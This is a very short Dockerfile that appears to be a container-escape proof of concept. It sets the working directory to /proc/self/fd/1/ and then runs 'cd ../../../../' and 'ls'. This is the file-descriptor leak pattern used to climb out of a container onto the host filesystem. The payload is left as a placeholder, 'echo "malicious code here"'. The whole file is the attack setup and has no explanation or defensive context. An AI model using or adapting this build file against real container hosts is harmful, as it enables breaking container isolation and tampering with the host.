FROM ubuntu

WORKDIR /proc/self/fd/1/

RUN cd ../../../../ && \
    ls && \
    echo "malicious code here"
